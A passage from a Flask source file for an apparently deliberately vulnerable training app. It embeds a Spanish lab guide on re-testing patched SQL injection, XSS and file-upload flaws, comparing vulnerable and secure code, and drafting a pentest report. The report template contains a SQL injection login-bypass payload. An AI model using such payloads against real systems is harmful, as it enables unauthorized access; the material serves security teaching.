            <p>El cliente indica que ha aplicado parches de seguridad. Activa el <strong>Modo Seguro</strong> (Puerto 8443) y verifica.</p>
            <ol>
                <li><strong>Re-Testing (Pruebas de Regresión):</strong>
                    <ul>
                        <li>Documenta el resultado: ¿Bloqueado? ¿Sanitizado? ¿Error genérico?</li>
                        <li>Ejecuta <strong>exactamente los mismos Payloads</strong> que funcionaron en la Fase 2.</li>
                        <li>Documenta el resultado para cada uno: ¿El payload se muestra como texto inofensivo? ¿La aplicación devuelve un error genérico? ¿Se bloquea la subida del archivo?</li>
                    </ul>
                </li>
                <li><strong>Análisis de Caja Blanca (Code Review):</strong>
                    <ul>
                        <li>Este es el paso clave para demostrar una comprensión profunda. No basta con ver que no funciona, hay que entender <strong>por qué</strong>.</li>
                        <li>Accede al código fuente del proyecto (<code>app/routes/</code>, <code>app/templates/</code>).</li>
                        <li>Para cada vulnerabilidad, localiza el bloque <code>if get_security_level() == 'secure':</code>.</li>
                        <li><strong>Entregable:</strong> Explica técnicamente por qué el código ahora es seguro (ej. "Se usa <code>cursor.execute</code> con tuplas para parametrizar" o "Jinja2 escapa automáticamente el output").</li>
                        <li><strong>Ejemplo para SQLi:</strong> Abre <code>app/routes/login.py</code>. Compara el bloque <code>if get_security_level() == 'vulnerable':</code> (que usa f-strings) con el bloque <code>else:</code> (que usa consultas parametrizadas <code>cursor.execute(query, (username, password))</code>). Explica la diferencia.</li>
                        <li><strong>Ejemplo para XSS:</strong> Abre <code>app/templates/search.html</code>. Compara <code>{{ query | safe }}</code> (vulnerable) con <code>{{ query }}</code> (seguro). Explica cómo el escape automático de Jinja2 neutraliza el ataque.</li>
                        <li><strong>Ejemplo para File Upload:</strong> Abre <code>app/routes/forum.py</code>. Verifica cómo se valida la extensión del archivo y se usa <code>secure_filename</code> en el bloque seguro.</li>
                        <li><strong>Entregable:</strong> Para cada vulnerabilidad, identifica el fragmento de código exacto que implementa la solución y explica su funcionamiento.</li>
                    </ul>
                </li>
            </ol>

            <hr>

            <h2>📊 Fase 4: Informe Ejecutivo (Simulado)</h2>
            <p>Como paso final, redacta un borrador del informe técnico que entregarías al cliente. Puedes usar un simple archivo de texto o Markdown.</p>
            <ol>
                <li><strong>Nombre del Hallazgo:</strong> (ej. SQL Injection en Login).</li>
                <li><strong>Severidad:</strong> (Crítica/Alta/Media/Baja).</li>
                <li><strong>Prueba de Concepto (PoC):</strong> El payload exacto usado.</li>
                <li><strong>Impacto:</strong> ¿Qué puede hacer un atacante con esto?</li>
                <li><strong>Recomendación:</strong> ¿Cómo se solucionó en el Modo Seguro?</li>
            </ol>

            <p>Para cada vulnerabilidad encontrada en la Fase 2, crea una entrada con este formato:</p>
            <pre><code class="language-markdown">### 1. SQL Injection en Autenticación

*   **Severidad:** Crítica (CVSS: 9.8)
*   **Descripción:** El formulario de inicio de sesión es vulnerable a inyección SQL, permitiendo a un atacante eludir el mecanismo de autenticación y obtener acceso no autorizado a cuentas privilegiadas.
*   **Prueba de Concepto (PoC):**
    *   **Usuario:** `admin' OR '1'='1' -- -`
    *   **Contraseña:** (cualquier valor)
*   **Impacto:** Compromiso total de la cuenta de administrador, lo que conlleva al control total de la plataforma.
*   **Recomendación:** Implementar consultas parametrizadas para separar el código SQL de los datos del usuario, tal y como se ha verificado en el entorno seguro.</code></pre>

            <hr>

            <h2>🏆 Criterios de Éxito</h2>
            <p>Has completado la auditoría si:</p>
            <ol>
                <li>Has obtenido acceso administrativo sin credenciales.</li>
                <li>Has extraído datos de la base de datos usando una inyección UNION.</li>
                <li>Has ejecutado JavaScript en el navegador de una víctima (simulada) mediante XSS Reflejado y Almacenado.</li>
                <li>Has verificado que <strong>ninguno</strong> de estos ataques funciona en el Modo Seguro y puedes explicar <strong>por qué</strong>, señalando el código fuente correcto.</li>
            </ol>
        """
    }
}

@bp.route('/labs')
def index():
    # Convertimos el diccionario a una lista para la plantilla, añadiendo el slug (clave)
    labs_list = []
    for slug, data in LABS.items():
        lab = data.copy()
        lab['slug'] = slug
        labs_list.append(lab)

    return render_template('labs.html', labs=labs_list)

@bp.route('/labs/<slug>')
def lab(slug):
    lab_data = LABS.get(slug)
    if not lab_data:
        abort(404)
    return render_template('lab_post.html', lab=lab_data)